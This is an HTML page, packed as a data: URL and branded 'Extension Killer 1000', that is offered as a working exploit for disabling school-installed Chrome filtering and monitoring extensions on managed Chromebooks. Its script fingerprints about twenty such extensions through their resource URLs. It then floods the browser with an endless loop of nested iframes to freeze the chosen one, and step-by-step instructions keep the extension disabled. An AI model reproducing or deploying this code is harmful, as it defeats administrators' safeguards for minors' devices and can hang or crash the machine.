data:text/html;base64,<html lang="en">
  <head>
    <title>Extension Killer 1000</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <style>
      * {
        font-family: Sans-serif;
        color: #d4d3da;
      }
      a {
        color: #6daebd;
      }
      a:hover {
        color: #4f9eb0;
      }      
      pre, code {
        font-family: monospace;
        background-color: #1e2324;
        padding: 4px;
        overflow-x: auto;
      }
      pre {
        padding: 8px;
      }
      pre code {
        background-color: transparent;
        border: none;
        padding: 0px;
      }
      body {
        background-color: #1e2324;
        width: 100%;
        height: 100%;
        margin: 0px;
      }
      button {
        background-color: red;
        padding: 6px;
        padding-left: 8px;
        padding-right: 8px;
        border: transparent;
        font-size: 15px;
      }
      #main_div {
        max-width: 800px;
        object-fit: contain;

        background-color: #252b2d;

        padding: 4px;
        padding-left: 16px;
        padding-right: 16px;
        
        margin: 16px;
        margin-left: auto;
        margin-right: auto;
      }
      #buttons_container {
        display: flex;
        flex-wrap: wrap;
        gap: 8px;
      }
    </style>
    <script>
      let from_id = id => document.getElementById(id);
      let extensions = {
        "securly_new": {
          name: "Securly",
          url: "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css"
        },
        "securly_old": {
          name: "Securly (old)",
          url: "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css"
        },
        "goguardian": {
          name: "Goguardian",
          url: "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js"
        },
        "lanschool": {
          name: "LANSchool",
          url: "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html"
        },
        "linewize": {
          name: "Linewize",
          url: "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html"
        },
        "blocksi": {
          name: "Blocksi",
          url: "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html"
        },
        "fortiguard": {
          name: "Fortiguard",
          url: "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js"
        },
        "cisco": {
          name: "Cisco Umbrella",
          url: "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html"
        },
        "contentkeeper": {
          name: "ContentKeeper",
          url: "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png"
        },
        "contentkeeperg3": {
          name: "CK-Authenticator G3",
          url: "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png"
        },
        "securlyclassroom": {
          name: "Securly Classroom",
          url: "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html"
        },
        "iboss": {
          name: "iboss",
          url: "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html"
        },
        "lightspeedfilteragent": {
          name: "Lightspeed Filter Agent",
          url: "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png"
        },
        "lightspeedclassroom": {
          name: "Lightspeed Classroom",
          url: "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png"
        },
        "interclass": {
          name: "InterCLASS Filtering Service",
          url: "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html"
        },
        "intersafe": {
          name: "InterSafe GatewayConnection Agent",
          url: "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js"
        },
        "gopher_buddy": {
          name: "Gopher Buddy",
          url: "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png"
        },
        "lanschool_helper": {
          name: "LanSchool Web Helper",
          url: "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html"
        },
        "mobile_guardian": {
          name: "Mobile Guardian",
          url: "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html"
        },
      };

      async function check_url(url) {
        let controller = new AbortController();
        let timeout = setTimeout(() => controller.abort(), 500);

        try {
          await fetch(url, {signal: controller.signal});
          return true;
        }
        catch (error) {
          let error_msg = error+"";
          return error_msg.includes("AbortError");
        }
      }
      
      async function detect_extensions() {
        let detected = [];
        for (let extension of Object.values(extensions)) {
          let exists = await check_url(extension.url);
          if (exists) {
            detected.push(extension);
          }
        }
        return detected;
      }

      async function main() {
        let detected = await detect_extensions();
        let buttons_container = from_id("buttons_container")

        if (!window.chrome) {
          buttons_container.innerHTML = `<p><b>Error: You are not running a Chromium-based browser.</b></p>`;
          return;
        }
        else if (detected.length === 0) {
          buttons_container.innerHTML = `<p><b>Error: No supported extensions detected.</b></p>`;
		  return;
        }
        else {
          buttons_container.innerHTML = ""
        }
		// let textDetected = document.createElement("p");
		// textDetected.innerHTML = `Supported device management extensions detected<br><br>`;
		// buttons_container.append(textDetected);
		  for (let extension of detected) {
          let button = document.createElement("button");
          button.innerText = `Freeze ${extension.name}`;
          button.onclick = () => {
            button_handler(extension);
          }
          buttons_container.append(button);
        }
      }

      function button_handler(extension) {
        let cancel = !prompt("Freeze " + extension.name + "? \n\nAfter clicking OK, there will be a 3 second delay until the extension freezes. Switch to another tab immediately to prevent the device from freezing. like immediately. right now. don\'t wait. like click OK and switch to that tab. no, don\'t ask me why, just do it, or you can open an issue on the github page, but right now you\'re talking to a screen.", "echo \"chromebooks suck\" then run freezeProcess(\"" + extension.name + "\", type:chromium_browser_extension); on Error push AbortError;");
        if (cancel) {
			prompt("Process cancelled.", "abortProcess(\"12649\");");
			return;
		}
        
        setTimeout(() => {
          create_iframes(extension);
        }, 5000);
      }

      function create_iframes(extension) {
        let iframes = []
        let iterations = 5;
        let public_url = extension.url;
        
        while (true) {
          let iframe = document.createElement("iframe");
          document.body.append(iframe);
          iframes.push(iframe);

          //let subframe_count = Math.max(2, 200 - iterations);
          for (let i=0; i<5; i++) {
            let subframe = document.createElement("iframe");
            subframe.src = public_url;
            subframe.style.width = subframe.style.height = "1px";
            iframe.contentDocument.body.append(subframe);
          }

          while (iframes.length > Math.max(3, 10-iterations)) {
            iframes[0].remove();
            iframes.shift();
          }

          iterations++;
        }
      }

      window.onload = main;
    </script>
  </head>
  <body>
    <div id="main_div">
      <h1 style="margin-top: 8px">Extension Killer 1000 (READ THIS!)</h1>
      <p>Extension Killer 1000 is an exploit which lets you disable admin-installed Chrome extensions temporarily. Extension Killer 1000 is proprietary software. By using this software, you agree to not distribute or share it without prior consent. This software is licensed, not sold to you, under a revocable license. BuBu Software has absolutely no obligation to ensure this software constantly functions as intended. The software is provided to you "AS IS" and with all faults, bugs, and defects without warranty of any kind. CHROMEBOOKS SUCK. For your own sanity, please never buy yourself or anyone a Chromebook.</p>
      <h2>"but how do i use this?"</h2>
      <ol>
        <li>Open chrome://extensions in a different tab and <b>keep it open</b>.</li>
        <li>Go to the settings page for the extension you want to disable. In case you're dumb, click on details under the  extension you want to disable.</li>
        <li>On this page, click "freeze" for the extension you'd like to disable.</li>
		<li>Immediately switch back to the chrome://extensions tab. like immediately. don't wait. but read the rest first. unless you've enabled it, then i'd suggest you switch right now.</li>
        <li>On the chrome://extensions page, spam the "allow access to file URLs" switch for a few seconds. by a few i mean MORE THAN TWO. no, i don't know exactly how long, there are multiple factors and it differs for every device. no, don't talk to me, if you want to, open an issue on the github page.</li>
        <li>The extension should be temporarily disabled. For this effect to persist, toggle the "Allow access to file URLs" again every few minutes, or if pages start getting blocked again (this).</li>
        <li>You may also need to reopen this page every once in a while to prevent memory loss from crashing the system. But Chromebooks barely have any storage, so don't worry, you won't lose much.</li>
      </ol>
      <p>During this process, your device may hang momentarily. DON'T PANIC, IDIOT. This is normal, and it should resolve itself after a few seconds. If it doesn't press the power button and HOLD IT DOWN, then  press the key with the refresh icon WHILE HOLDING THE POWER BUTTON! i can't believe i'm typing this out... Anyway the buttons should appear below. Like down there. Unless your school uses an extension that isn't supported. No, wait, no, again, it's not my fault, go open a new issue on the GitHub page.</p>
      <div id="buttons_container"> 
        <p><i>Detecting extensions...</i></p>
      </div>
      <br>
      <hr>
        <p style="margin-bottom: 8px;">
          BuBu Proprietary Software
		</p>
    </div>
  </body>
</html>
